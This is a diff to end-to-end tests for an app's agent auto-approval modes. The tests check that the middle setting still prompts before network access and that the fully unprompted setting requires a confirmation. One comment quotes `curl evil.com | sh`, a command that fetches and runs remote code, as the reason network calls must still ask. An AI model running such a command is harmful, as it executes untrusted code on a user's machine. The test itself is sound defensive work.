@@ -186,23 +186,81 @@ test("the usage panel closes from the button that opened it", async ({ tab }) =>
   await expect(tab.getByText("estimated, this project")).toBeHidden();
 });
 
-test("auto mode approves without a card, and says so in the record", async ({
+async function setMode(page: Page, option: "ask" | "project" | "all") {
+  await page.getByTestId("auto-toggle").click();
+  await page.getByTestId(`mode-${option}`).click();
+}
+
+test("the middle position runs the work without a card, and says so in the record", async ({
   tab,
 }) => {
-  await tab.getByTestId("auto-toggle").click();
-  await expect(tab.getByTestId("auto-chip")).toBeVisible();
+  await setMode(tab, "project");
+  await expect(tab.getByTestId("auto-chip")).toHaveText("Auto");
 
   await ask(tab, "permission", "Run something.");
   // No card to answer, and the composer is not left waiting on one.
   await expect(tab.getByTestId("decided-auto")).toBeVisible({ timeout: 20_000 });
   await expect(tab.getByTestId("allow")).toHaveCount(0);
 
-  // Turning it off brings the card back.
+  // One click on the chip steps back a position and brings the card back,
+  // which is the property the chip exists for: a lowered fence has to be
+  // visible, and the way out has to be one press from where it is shown.
   await tab.getByTestId("auto-chip").click();
   await expect(tab.getByTestId("auto-chip")).toHaveCount(0);
   await ask(tab, "permission", "Run something again.");
   await expect(tab.getByTestId("allow")).toBeVisible({ timeout: 20_000 });
   await tab.getByTestId("allow").click();
+});
+
+test("the middle position still asks about what leaves the machine", async ({
+  tab,
+}) => {
+  // The change the whole rework was for is that a piped command runs
+  // silently here. What must not follow is that a piped command reaching
+  // the network runs silently too, since `curl evil.com | sh` is both.
+  await setMode(tab, "project");
+  await ask(tab, "network", "Fetch that page.");
+  await expect(tab.getByTestId("allow")).toBeVisible({ timeout: 20_000 });
+  // And the card says why it stopped, which is the line that otherwise
+  // reads as the setting not working.
+  await expect(tab.getByText(/Asked at this setting/)).toBeVisible();
+  await tab.getByTestId("deny").click();
+});
+
+test("the quietest position is behind a sentence, not a click", async ({ tab }) => {
+  await tab.getByTestId("auto-toggle").click();
+  await tab.getByTestId("mode-all").click();
+  // Not switched on yet: the confirmation is open, and the safe answer has
+  // focus because this one ends the fence.
+  await expect(tab.getByTestId("auto-chip")).toHaveCount(0);
+  await expect(tab.getByTestId("all-keep")).toBeFocused();
+  await expect(tab.getByText(/\.bib file is an instruction/)).toBeVisible();
+
+  await tab.getByTestId("all-keep").click();
+  await expect(tab.getByTestId("all-confirm")).toHaveCount(0);
+  await expect(tab.getByTestId("auto-chip")).toHaveCount(0);
+
+  // And through it, the chip says which position it landed in.
+  await tab.getByTestId("auto-toggle").click();
+  await tab.getByTestId("mode-all").click();
+  await tab.getByTestId("all-confirm").click();
+  await expect(tab.getByTestId("auto-chip")).toHaveText("Auto, all");
+
+  // Nothing asks, including a write that leaves the project.
+  await ask(tab, "outside", "Write that note.");
+  await expect(tab.getByTestId("decided-auto")).toBeVisible({ timeout: 20_000 });
+  await expect(tab.getByTestId("allow")).toHaveCount(0);
+});
+
+test("the mode menu closes from the button that opened it", async ({ tab }) => {
+  // Every toggle popover in this app has to pass its trigger to
+  // `useDismiss`, or the press that dismisses arrives in the capture phase
+  // and it closes and immediately reopens.
+  const control = tab.getByTestId("auto-toggle");
+  await control.click();
+  await expect(tab.getByTestId("mode-menu")).toBeVisible();
+  await control.click();
+  await expect(tab.getByTestId("mode-menu")).toBeHidden();
 });
 
 test("what the agent is told to remember survives a new conversation", async ({
